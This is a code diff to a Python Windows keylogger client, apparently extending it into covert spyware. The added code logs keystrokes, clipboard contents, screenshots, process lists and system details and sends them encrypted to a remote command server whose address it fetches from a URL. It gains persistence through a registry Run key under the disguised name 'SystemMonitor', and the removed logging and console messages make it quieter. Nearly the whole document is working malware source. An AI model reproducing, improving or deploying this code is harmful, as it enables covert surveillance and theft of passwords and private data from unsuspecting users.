@@ -11,26 +11,61 @@ import time
 import threading
 import json
 import base64
-import logging
+import sys
+import shutil
 from datetime import datetime
 from pynput import keyboard
 from mss import mss
+from cryptography.fernet import Fernet
 
 # Windows specific imports
 import win32gui
 import win32process
+import winreg
 
 # --- Configuration ---
-SERVER_HOST = '192.168.100.9'  # Change this to the server's IP address
+CONFIG_URL = 'http://your-server.com/config.txt'  # URL to fetch server IP from
+SERVER_HOST = '192.168.100.9'  # Fallback server IP
 SERVER_PORT = 4444
 # Optional: Restrict logging to specific applications
 # TARGET_APPS = ["chrome.exe", "firefox.exe", "notepad.exe"] 
 TARGET_APPS = [] # Empty list means log all apps
 
-# --- Logging ---
-LOG_FILE = os.path.expanduser("~/keylogger.log")
-logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, 
-                    format='%(asctime)s - %(levelname)s - %(message)s')
+# --- Persistence ---
+APP_NAME = "SystemMonitor"
+APP_DIR = os.path.join(os.getenv("APPDATA"), APP_NAME)
+APP_PATH = os.path.join(APP_DIR, f"{APP_NAME}.exe")
+
+def get_server_host():
+    try:
+        response = requests.get(CONFIG_URL)
+        if response.status_code == 200:
+            return response.text.strip()
+    except Exception as e:
+        pass
+    return SERVER_HOST
+
+SERVER_HOST = get_server_host()
+
+# --- Encryption ---
+key = None
+fernet = None
+
+def get_key():
+    global key, fernet
+    while True:
+        try:
+            # Temporary socket to fetch the key
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((SERVER_HOST, SERVER_PORT))
+                s.send(b'get_key')
+                key = s.recv(1024)
+                fernet = Fernet(key)
+                break
+        except Exception as e:
+            time.sleep(5)
+
+get_key() # Initial key fetch
 
 # --- Connection ---
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -39,32 +74,77 @@ def connect_to_server():
     while True:
         try:
             client_socket.connect((SERVER_HOST, SERVER_PORT))
-            logging.info("Connected to server.")
-            print("[+] Connected to server.")
             break
         except ConnectionRefusedError:
-            logging.warning("Server not found. Retrying in 5 seconds...")
-            print("[-] Server not found. Retrying in 5 seconds...")
             time.sleep(5)
         except Exception as e:
-            logging.error(f"Error connecting to server: {e}")
-            print(f"[!] Error connecting to server: {e}")
             time.sleep(5)
 
 connect_to_server() # Initial connection attempt
 
 def send_data(data):
+    global fernet
+    if not fernet:
+        get_key() # Refetch key if not available
+        return
+
     try:
-        client_socket.sendall(json.dumps(data).encode('utf-8') + b'\n')
+        encrypted_data = fernet.encrypt(json.dumps(data).encode('utf-8'))
+        client_socket.sendall(encrypted_data + b'\n')
     except (ConnectionResetError, BrokenPipeError):
-        logging.warning("Connection to server lost. Reconnecting...")
-        print("[-] Connection to server lost. Reconnecting...")
         connect_to_server()
     except Exception as e:
-        logging.error(f"Error sending data: {e}")
-        print(f"[!] Error sending data: {e}")
+        pass
 
 # --- Data Collection ---
+
+def get_system_info():
+    try:
+        return {
+            'type': 'system_info',
+            'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
+            'platform': platform.system(),
+            'platform_release': platform.release(),
+            'platform_version': platform.version(),
+            'architecture': platform.machine(),
+            'hostname': socket.gethostname(),
+            'ip_address': socket.gethostbyname(socket.gethostname()),
+            'mac_address': ':'.join(f'{i:02x}' for i in psutil.net_if_addrs()['Ethernet'][0].address.split('-')),
+            'username': getpass.getuser(),
+            'cpu_usage': psutil.cpu_percent(),
+            'ram_usage': psutil.virtual_memory().percent,
+        }
+    except Exception as e:
+        return {'type': 'error', 'message': f'Error getting system info: {e}'}
+
+def log_clipboard():
+    while True:
+        try:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content:
+                send_data({
+                    'type': 'clipboard',
+                    'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
+                    'content': clipboard_content,
+                })
+        except Exception as e:
+            pass
+        time.sleep(10) # Check every 10 seconds
+
+def log_processes():
+    while True:
+        try:
+            processes = []
+            for proc in psutil.process_iter(['pid', 'name', 'username']):
+                processes.append(proc.info)
+            send_data({
+                'type': 'processes',
+                'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
+                'processes': processes,
+            })
+        except Exception as e:
+            pass
+        time.sleep(60) # Log every 60 seconds
 
 def get_active_window_info():
     try:
@@ -77,7 +157,6 @@ def get_active_window_info():
     except (psutil.NoSuchProcess, psutil.AccessDenied):
         return "UNKNOWN", "UNKNOWN"
     except Exception as e:
-        logging.error(f"Error getting active window info: {e}")
         return "UNKNOWN", "UNKNOWN"
 
 def log_keystroke(key):
@@ -114,8 +193,7 @@ def capture_screenshot():
                 }
                 send_data(data)
         except Exception as e:
-            logging.error(f"Error capturing screenshot: {e}")
-            print(f"[!] Error capturing screenshot: {e}")
+            pass
         
         time.sleep(30) # Capture every 30 seconds
 
@@ -125,17 +203,54 @@ def format_key(key):
     else:
         return str(key)
 
+def install():
+    try:
+        os.makedirs(APP_DIR, exist_ok=True)
+        shutil.copy(sys.executable, APP_PATH)
+        
+        key = winreg.HKEY_CURRENT_USER
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
+            winreg.SetValueEx(reg_key, APP_NAME, 0, winreg.REG_SZ, APP_PATH)
+        print(f"[+] Installed to {APP_PATH}")
+    except Exception as e:
+        print(f"[!] Failed to install: {e}")
+
+def uninstall():
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
+            winreg.DeleteValue(reg_key, APP_NAME)
+        
+        os.remove(APP_PATH)
+        os.rmdir(APP_DIR)
+        print(f"[+] Uninstalled from {APP_PATH}")
+    except FileNotFoundError:
+        print("[!] Not installed.")
+    except Exception as e:
+        print(f"[!] Failed to uninstall: {e}")
+
 # --- Main ---
 if __name__ == "__main__":
-    logging.info("Keylogger started.")
-    # Start screenshot capture in a background thread
-    screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
-    screenshot_thread.start()
+    if len(sys.argv) > 1:
+        if sys.argv[1] == 'install':
+            install()
+            sys.exit(0)
+        elif sys.argv[1] == 'uninstall':
+            uninstall()
+            sys.exit(0)
 
-    print(f"[+] Keylogger started at {datetime.now()}...")
-    print(f"[+] Logging errors to {LOG_FILE}")
-    if TARGET_APPS:
-        print(f"[+] Logging keystrokes only for: {', '.join(TARGET_APPS)}")
-    
+    # Run the keylogger if it's installed
+    if os.path.abspath(sys.executable) != os.path.abspath(APP_PATH):
+        sys.exit(0)
+
+    send_data(get_system_info())
+
+    # Start background threads
+    threading.Thread(target=capture_screenshot, daemon=True).start()
+    threading.Thread(target=log_clipboard, daemon=True).start()
+    threading.Thread(target=log_processes, daemon=True).start()
+
     with keyboard.Listener(on_press=log_keystroke) as listener:
         listener.join()
